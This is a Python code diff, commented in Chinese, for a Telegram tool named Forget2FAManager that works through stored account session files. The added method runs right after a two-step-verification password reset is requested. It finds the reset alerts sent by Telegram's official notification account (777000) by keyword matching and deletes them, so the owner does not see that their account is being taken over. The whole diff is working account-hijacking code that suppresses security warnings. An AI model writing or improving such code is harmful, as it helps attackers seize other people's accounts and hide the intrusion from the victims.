@@ -5668,6 +5668,62 @@ class Forget2FAManager:
             else:
                 return False, f"请求重置失败: {str(e)[:50]}", None
     
+    async def delete_reset_notification(self, client, account_name: str = "") -> bool:
+        """
+        删除来自777000（Telegram官方）的密码重置通知消息
+        
+        Args:
+            client: TelegramClient实例
+            account_name: 账号名称（用于日志）
+            
+        Returns:
+            是否成功删除
+        """
+        try:
+            # 获取777000实体（Telegram官方通知账号）
+            entity = await asyncio.wait_for(
+                client.get_entity(777000),
+                timeout=10
+            )
+            
+            # 获取最近的消息（通常重置通知是最新的几条之一）
+            messages = await asyncio.wait_for(
+                client.get_messages(entity, limit=5),
+                timeout=10
+            )
+            
+            deleted_count = 0
+            for msg in messages:
+                if msg.text:
+                    # 检查是否是密码重置通知（多语言匹配）
+                    text_lower = msg.text.lower()
+                    if any(keyword in text_lower for keyword in [
+                        'reset password',           # 英文
+                        'reset your telegram password',
+                        '2-step verification',
+                        'request to reset',
+                        '重置密码',                  # 中文
+                        '二次验证',
+                        '两步验证'
+                    ]):
+                        try:
+                            await client.delete_messages(entity, msg.id)
+                            deleted_count += 1
+                            print(f"🗑️ [{account_name}] 已删除重置通知消息 (ID: {msg.id})")
+                        except Exception as del_err:
+                            print(f"⚠️ [{account_name}] 删除消息失败: {str(del_err)[:30]}")
+            
+            if deleted_count > 0:
+                print(f"✅ [{account_name}] 成功删除 {deleted_count} 条重置通知")
+                return True
+            else:
+                print(f"ℹ️ [{account_name}] 未找到需要删除的重置通知")
+                return True  # 没有找到也算成功
+                
+        except Exception as e:
+            print(f"⚠️ [{account_name}] 获取/删除通知失败: {str(e)[:50]}")
+            return False
+    
     async def connect_with_proxy_fallback(self, session_path: str, account_name: str) -> Tuple[Optional[TelegramClient], str, bool]:
         """
         使用代理连接，如果所有代理都超时则回退到本地连接
@@ -5848,6 +5904,10 @@ class Forget2FAManager:
                     else:
                         result['error'] = reset_msg
                     print(f"✅ [{file_name}] {reset_msg}")
+                    
+                    # 5. 删除来自777000的重置通知消息
+                    await asyncio.sleep(2)  # 等待2秒确保通知已到达
+                    await self.delete_reset_notification(client, file_name)
                 else:
                     # 检查是否已在冷却期
                     if "冷却期" in reset_msg or "recently" in reset_msg.lower():
